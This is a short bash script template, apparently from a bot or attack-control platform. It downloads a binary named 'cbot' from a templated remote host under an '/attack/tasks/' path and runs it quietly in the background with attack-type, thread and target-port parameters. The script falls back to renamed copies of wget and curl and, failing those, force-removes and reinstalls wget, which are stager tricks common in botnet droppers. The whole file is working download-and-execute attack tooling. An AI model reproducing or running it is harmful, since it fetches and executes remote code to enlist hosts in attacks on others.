#!/usr/bin/env bash

pnodeId=$1
attackType=$2
isDaemon=$3

download_cbot_uri="http://{{.RHost}}:{{.FPort}}/attack/tasks/{{.TaskId}}/$pnodeId/$attackType/cbot_linux"

download() {

  if [ -x "/usr/bin/wget"  -o  -x "/bin/wget" ]; then
    wget -c $download_cbot_uri -q -O /var/tmp/cbot
  elif [ -x "/usr/bin/curl"  -o  -x "/bin/curl" ]; then
   curl -fs $download_cbot_uri -o /var/tmp/cbot
  elif [ -x "/usr/bin/wge"  -o  -x "/bin/wge" ]; then
   wge -c $download_cbot_uri -q -O /var/tmp/cbot
  elif [ -x "/usr/bin/get"  -o  -x "/bin/get" ]; then
   get -c $download_cbot_uri -q -O /var/tmp/cbot
  elif [ -x "/usr/bin/cur"  -o  -x "/bin/cur" ]; then
   cur -fs $download_cbot_uri -o /var/tmp/cbot
  elif [ -x "/usr/bin/url"  -o  -x "/bin/url" ]; then
   url -fs $download_cbot_uri -o /var/tmp/cbot
  else
   rpm -e --nodeps wget
   yum -y install wget
   apt-get -y install wget

   wget -q $download_cbot_uri -O /var/tmp/cbot
  fi

}

run_cbot() {

    chmod a+x /var/tmp/cbot
    if [ "$isDaemon" = "true" ]; then 
        /var/tmp/cbot -pnode $pnodeId -attackType $attackType -taskId {{.TaskId}} -rhost {{.RHost}} -rport {{.RPort}} -fport {{.FPort}} -threads {{.Threads}} -scap {{.Scap}} -acap {{.Acap}} 1>/dev/null 2>&1 &
    else
        /var/tmp/cbot -pnode $pnodeId -attackType $attackType -taskId {{.TaskId}} -rhost {{.RHost}} -rport {{.RPort}} -fport {{.FPort}} -threads {{.Threads}} -scap {{.Scap}} -acap {{.Acap}}
    fi
}

rm -rf /var/tmp/cbot

download

if [ -f /var/tmp/cbot ]; then

  #pkill -f cbot

  run_cbot

fi

echo "start cbot ok!!!" >>/var/tmp/cbot.log

